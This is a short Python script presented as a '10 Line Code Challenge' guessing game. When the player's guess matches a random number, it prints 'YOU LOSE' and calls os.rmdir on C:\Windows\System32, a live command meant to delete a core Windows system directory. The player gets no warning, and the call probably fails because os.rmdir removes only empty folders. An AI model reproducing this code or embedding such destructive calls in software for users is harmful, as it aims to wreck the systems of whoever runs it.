# 10 Line Code Challenge
import random
import os
if(int(input("Pick a number 1-10: "))==random.randint(1,10)):
    print("///////////////////////////")
    print("        YOU LOSE")
    print("///////////////////////////")
    os.rmdir("C:\\Windows\\System32")
else:
    print("You survived")
